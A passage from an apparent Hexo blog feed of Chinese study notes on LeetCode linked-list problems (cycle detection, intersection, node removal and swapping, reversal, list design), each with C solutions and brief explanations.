z</code></p><p>（1）移动快慢指针，找到相遇点</p><p>（2）定义两个指针p、q，一个指向头节点，另一个指向相遇点；两个指针每次同时移动一个节点直到相遇，这里与第一种情况不同，就是第二个指针会多转几圈才会与第一个指针相遇，该相遇点则为环形入口点</p></li></ul></li></ol><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> ListNode *<span class="title function_">detectCycle</span><span class="params">(<span class="keyword">struct</span> ListNode *head)</span> {</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">slow</span> =</span> head;  <span class="comment">//慢指针</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">fast</span> =</span> head;  <span class="comment">//快指针</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">p</span> =</span> head;     </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">q</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(fast!=<span class="literal">NULL</span> &amp;&amp; fast-&gt;next != <span class="literal">NULL</span>) {</span><br><span class="line">        slow = slow-&gt;next;</span><br><span class="line">        fast = fast-&gt;next-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(slow == fast) {</span><br><span class="line">            q = slow;   <span class="comment">//q指向相遇点</span></span><br><span class="line">            <span class="keyword">while</span>(slow == fast) {</span><br><span class="line">                <span class="keyword">if</span>(q == p)</span><br><span class="line">                    <span class="keyword">return</span> q;   <span class="comment">//环形入口点</span></span><br><span class="line">                q = q-&gt;next;</span><br><span class="line">                p = p-&gt;next;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>链表相交</title>
    <link href="/2024/01/19/%E9%93%BE%E8%A1%A8%E7%9B%B8%E4%BA%A4/"/>
    <url>/2024/01/19/%E9%93%BE%E8%A1%A8%E7%9B%B8%E4%BA%A4/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/intersection-of-two-linked-lists-lcci/</p><p>这题也是408的原题。</p><p>解决思路：</p><ul><li>分别定义两个指针指向两个字符串首地址</li><li>计算出两个字符串的长度</li><li>移动长度较大的字符串的指针，使得两个指针指向的节点到尾节点之间的节点个数相同（即链表末尾对齐）</li><li>同时移动两个指针，若存在指针相同的节点则返回该节点，否则返回NULL</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode *<span class="title function_">getIntersectionNode</span><span class="params">(<span class="keyword">struct</span> ListNode *headA, <span class="keyword">struct</span> ListNode *headB)</span> {</span><br><span class="line">    <span class="type">int</span> count_A = <span class="number">0</span>;  <span class="comment">//记录A串字符个数</span></span><br><span class="line">    <span class="type">int</span> count_B = <span class="number">0</span>;  <span class="comment">//记录B串字符个数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">pa</span> =</span> headA, *pb = headB;</span><br><span class="line">    <span class="keyword">while</span>(pa!=<span class="literal">NULL</span>) {</span><br><span class="line">        count_A++;</span><br><span class="line">        pa = pa-&gt;next;</span><br><span class="line">    }  <span class="comment">//计算字符个数</span></span><br><span class="line">    <span class="keyword">while</span>(pb!=<span class="literal">NULL</span>) {</span><br><span class="line">        count_B++;</span><br><span class="line">        pb = pb-&gt;next;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    pa = headA;</span><br><span class="line">    pb = headB;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(count_A &gt; count_B) {</span><br><span class="line">        pa = pa-&gt;next;</span><br><span class="line">        count_A--;</span><br><span class="line">    } <span class="comment">//若A串比B串长，则移动A指针</span></span><br><span class="line">    <span class="keyword">while</span>(count_A &lt; count_B) {</span><br><span class="line">        pb = pb-&gt;next;</span><br><span class="line">        count_B--;</span><br><span class="line">    } <span class="comment">//若A串比B串短，则移动B指针</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(pa!=<span class="literal">NULL</span>) {</span><br><span class="line">        <span class="keyword">if</span>(pa == pb)</span><br><span class="line">            <span class="keyword">return</span> pa; <span class="comment">//若存在相同的节点，则返回该节点</span></span><br><span class="line">        pa = pa-&gt;next;</span><br><span class="line">        pb = pb-&gt;next;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>删除链表的倒数第N个节点</title>
    <link href="/2024/01/12/%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%ACN%E4%B8%AA%E8%8A%82%E7%82%B9/"/>
    <url>/2024/01/12/%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%ACN%E4%B8%AA%E8%8A%82%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/remove-nth-node-from-end-of-list/</p><p>408数据结构出现过的原题，使用<strong>双指针法</strong>，同时定义一个虚拟头节点，方便删除操作。</p><ul><li>先移动右指针，指向第N个节点。</li><li>同时移动两个指针直到右指针指向最后一个节点，此时左指针指向倒数第N个节点。</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">removeNthFromEnd</span><span class="params">(<span class="keyword">struct</span> ListNode* head, <span class="type">int</span> n)</span> {</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">l</span>;</span>  <span class="comment">//左指针</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">r</span>;</span>  <span class="comment">//右指针</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">vh</span> =</span> (<span class="keyword">struct</span> ListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line">    vh-&gt;val = <span class="number">0</span>;</span><br><span class="line">    vh-&gt;next = head;     <span class="comment">//虚拟头节点的下一个节点为链表首元节点</span></span><br><span class="line">    l = vh;</span><br><span class="line">    r = vh;</span><br><span class="line">    <span class="keyword">while</span>(r-&gt;next != <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="keyword">if</span>(n){</span><br><span class="line">            r = r-&gt;next;   <span class="comment">//先移动右指针</span></span><br><span class="line">            n = n<span class="number">-1</span>;   </span><br><span class="line">        }</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>{</span><br><span class="line">            l = l-&gt;next;</span><br><span class="line">            r = r-&gt;next;   <span class="comment">//同时移动左指针和右指针</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    l-&gt;next = l-&gt;next-&gt;next; <span class="comment">//删除倒数第N个节点</span></span><br><span class="line">    </span><br><span class="line">    head = vh-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(vh);</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>两两交换链表中的节点</title>
    <link href="/2024/01/10/%E4%B8%A4%E4%B8%A4%E4%BA%A4%E6%8D%A2%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9/"/>
    <url>/2024/01/10/%E4%B8%A4%E4%B8%A4%E4%BA%A4%E6%8D%A2%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/swap-nodes-in-pairs/</p><p>这题的一个重要思想就是定义<strong>虚拟头节点</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">swapPairs</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span> {</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">p</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">vh</span> =</span> (<span class="keyword">struct</span> ListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode)); <span class="comment">//虚拟头节点</span></span><br><span class="line">    vh-&gt;next = head;</span><br><span class="line">    p = vh;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next!=<span class="literal">NULL</span>) {</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">q</span> =</span> p-&gt;next;  <span class="comment">//q存放要交换的第一个节点</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">s</span> =</span> p-&gt;next-&gt;next;  <span class="comment">//s存放要交换的第二个节点</span></span><br><span class="line">        <span class="keyword">if</span>(s == <span class="literal">NULL</span>)  <span class="comment">//若s为NULL（说明节点数为奇数），则退出循环（即最后一个节点不进行交换操作）</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        p-&gt;next = s;</span><br><span class="line">        q-&gt;next = s-&gt;next;</span><br><span class="line">        s-&gt;next = q;   <span class="comment">//交换q、s节点的位置</span></span><br><span class="line">        p = q;         <span class="comment">//更新p指针</span></span><br><span class="line">    }</span><br><span class="line">    head = vh-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(vh);   <span class="comment">//释放vh的内存</span></span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>翻转链表</title>
    <link href="/2024/01/10/%E7%BF%BB%E8%BD%AC%E9%93%BE%E8%A1%A8/"/>
    <url>/2024/01/10/%E7%BF%BB%E8%BD%AC%E9%93%BE%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/reverse-linked-list/</p><p>这题有两种思路，一种是<strong>双指针法</strong>，另一种是<strong>递归法</strong>。我使用的是双指针法，因为其空间复杂度更低，下面是《代码随想录》中的动图：</p><p><img src="https://code-thinking.cdn.bcebos.com/gifs/206.%E7%BF%BB%E8%BD%AC%E9%93%BE%E8%A1%A8.gif"></p><p>由上图易得：当<code>cur</code>指向<code>NULL</code>时，翻转结束</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">reverseList</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span>{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">cur</span> =</span> head;  <span class="comment">//指向待翻转的链表头节点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">pre</span> =</span> <span class="literal">NULL</span>;  <span class="comment">//指向翻转过程中形成的新链表的头节点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">tmp</span>;</span>         <span class="comment">//暂存指针</span></span><br><span class="line">    <span class="keyword">while</span>(cur) {</span><br><span class="line">        tmp = cur-&gt;next;          <span class="comment">//暂存待翻转的结点</span></span><br><span class="line">        cur-&gt;next = pre;          <span class="comment">//翻转</span></span><br><span class="line">        pre = cur;                <span class="comment">//pre指向新链表的头节点</span></span><br><span class="line">        cur = tmp;                <span class="comment">//cur指向待翻转的结点</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> pre;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>设计链表</title>
    <link href="/2024/01/09/%E8%AE%BE%E8%AE%A1%E9%93%BE%E8%A1%A8/"/>
    <url>/2024/01/09/%E8%AE%BE%E8%AE%A1%E9%93%BE%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/design-linked-list/</p><p>这题考察基本功，需要注意的细节不少，使用C语言则只能通过虚拟头节点实现。</p><blockquote><p>因为函数所传递的参数均为<strong>节点指针</strong>，而头插法会改变头节点指针（即头节点地址），若没有虚拟头节点，函数运行结束后，不会改变头节点指针的值（类似两个参数交换数值，改变的只是变量副本，与原变量无关），因此无法实现头插法</p><p>除非参数为为头节点<strong>指针的地址</strong>，即<code>MyLinkedList** obj</code></p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">MyLinkedList</span>{</span></span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">MyLinkedList</span> *<span class="title">next</span>;</span></span><br><span class="line">} MyLinkedList;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MyLinkedList* <span class="title function_">myLinkedListCreate</span><span class="params">()</span> {  <span class="comment">//初始化虚拟头节点（不存储数据），始终不变</span></span><br><span class="line">    MyLinkedList *head = (MyLinkedList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MyLinkedList));</span><br><span class="line">    head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">myLinkedListGet</span><span class="params">(MyLinkedList* obj, <span class="type">int</span> index)</span> { <span class="comment">//获取下标为index的节点的值</span></span><br><span class="line">    MyLinkedList *p = obj;</span><br><span class="line">    <span class="keyword">while</span>(index--){</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    }   <span class="comment">//循环结束p指向index的前一个节点</span></span><br><span class="line">    <span class="keyword">if</span>(p-&gt;next== <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> p-&gt;next-&gt;val;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">myLinkedListAddAtHead</span><span class="params">(MyLinkedList* obj, <span class="type">int</span> val)</span> {  <span class="comment">//头插法</span></span><br><span class="line">    MyLinkedList *p = (MyLinkedList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MyLinkedList));</span><br><span class="line">    p-&gt;val = val;</span><br><span class="line">    p-&gt;next = obj-&gt;next;</span><br><span class="line">    obj-&gt;next = p;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">myLinkedListAddAtTail</span><span class="params">(MyLinkedList* obj, <span class="type">int</span> val)</span> {  <span class="comment">//尾插法</span></span><br><span class="line">    MyLinkedList *p = obj;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next!=<span class="literal">NULL</span>) {</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    }</span><br><span class="line">    p-&gt;next = (MyLinkedList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MyLinkedList));</span><br><span class="line">    p-&gt;next-&gt;val = val;</span><br><span class="line">    p-&gt;next-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">myLinkedListAddAtIndex</span><span class="params">(MyLinkedList* obj, <span class="type">int</span> index, <span class="type">int</span> val)</span> { <span class="comment">//在下标为index的节点前插入节点</span></span><br><span class="line">    MyLinkedList *p = obj;   </span><br><span class="line">    <span class="keyword">while</span>(index--) {</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    }</span><br><span class="line">    MyLinkedList *tmp = (MyLinkedList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MyLinkedList));</span><br><span class="line">    tmp-&gt;val = val;</span><br><span class="line">    tmp-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next = tmp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">myLinkedListDeleteAtIndex</span><span class="params">(MyLinkedList* obj, <span class="type">int</span> index)</span> { <span class="comment">//删除下标为index的节点</span></span><br><span class="line">    MyLinkedList *p = obj;</span><br><span class="line">    <span class="keyword">while</span>(index--) {</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        MyLinkedList *del = p-&gt;next;</span><br><span class="line">        p-&gt;next = p-&gt;next-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(del);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">myLinkedListFree</span><span class="params">(MyLinkedList* obj)</span> {  <span class="comment">//释放链表空间</span></span><br><span class="line">    <span class="keyword">while</span>(obj != <span class="literal">NULL</span>){</span><br><span class="line">        MyLinkedList *tmp = obj;</span><br><span class="line">        obj = obj-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(tmp);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>链表的相关问题</title>
    <link href="/2024/01/09/%E9%93%BE%E8%A1%A8%E7%9A%84%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/"/>
    <url>/2024/01/09/%E9%93%BE%E8%A1%A8%E7%9A%84%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>今天在学习链表时遇到了几个困惑的点（C语言）</p><h2 id="使用malloc函数">使用malloc函数</h2><p>使用结构体时，为了方便，往往会使用指针指向一个结构体，这时候就需要使用<code>malloc</code>为该指针开辟一个结构体大小的空间，如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> {</span></span><br><span class="line">    <span class="type">int</span> val;               <span class="comment">// 节点值</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">next</span>;</span> <span class="comment">// 指向下一节点的指针（引用）</span></span><br><span class="line">}Lnode,*LiStack <span class="comment">//LiStack是该结构体类型的指针</span></span><br><span class="line"></span><br><span class="line">LiStack l = (LiStack)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LiStack));</span><br></pre></td></tr></tbody></table></figure><h2 id="在函数中调用结构体指针">在函数中调用结构体指针</h2><p>网上的文章中有的函数调用中加了'*'号，有的又没加，所以我搜索了一下什么时候需要在函数调用时使用'*'号。下面是示例代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> {</span></span><br><span class="line">    <span class="type">int</span> val;               <span class="comment">// 节点值</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">next</span>;</span> <span class="comment">// 指向下一节点的指针（引用）</span></span><br><span class="line">}Lnode,*LiStack;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_List</span><span class="params">(LiStack a)</span></span><br><span class="line">{</span><br><span class="line">    a-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(LiStack a, <span class="type">int</span> ele)</span> <span class="comment">//头插法</span></span><br><span class="line">{</span><br><span class="line">    Lnode * p = (Lnode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Lnode));</span><br><span class="line">    p-&gt;next = a-&gt;next;</span><br><span class="line">    a-&gt;next = p;</span><br><span class="line">    p-&gt;val = ele;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">(LiStack a)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> dele;</span><br><span class="line">    <span class="keyword">if</span>(a-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        dele = 